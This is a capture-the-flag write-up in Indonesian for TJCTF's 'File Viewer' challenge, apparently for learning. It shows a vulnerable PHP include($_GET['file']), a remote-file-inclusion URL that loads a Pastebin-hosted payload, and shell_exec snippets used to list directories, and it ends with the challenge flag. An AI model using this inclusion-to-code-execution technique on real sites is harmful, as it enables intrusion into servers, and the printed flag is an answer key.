## File Viewer,70 ##

Soal :

`So I've been developing this really cool site where you can read text files! It's still in beta mode, though, so there's only six files you can read.`

[Site](https://file_viewer.tjctf.org)

Ada sebuah input form dalam site. Jika kita lakukan input, ternyata site menggunakan `http://file_viewer.tjctf.org/reader.php?file=` untuk menampilkan file yang kita minta.

```php
$file = $_GET[‘file’];
include($file);
```

Karena ternyata hanya seperti itu, kita dapat melakukan RFI. Dengan menggunakan bantuan dari pastebin, `(http://file_viewer.tjctf.org/reader.php?file=https://pastebin.com/yourpayloadhere)` saya membuat payload dengan isi :

```php
<?php
echo shell_exec("ls");
?>
```
ternyata ada satu direktori yang bernama `i_wonder_whats_in_here`.

Setelah itu cek ada apa saja di direktori itu dengan :

```php
<?php
echo shell_exec("ls i_wonder_whats_in_here")
?>
```
Ternyata ada sebuah file dengan nama `flag.php`.

Langsung saja saya `cat` file tersebut, lihat source page, dan flag berhasil didapatkan.

Flag : `tjctf{n1c3_j0b_with_lf1_2_rc3}`


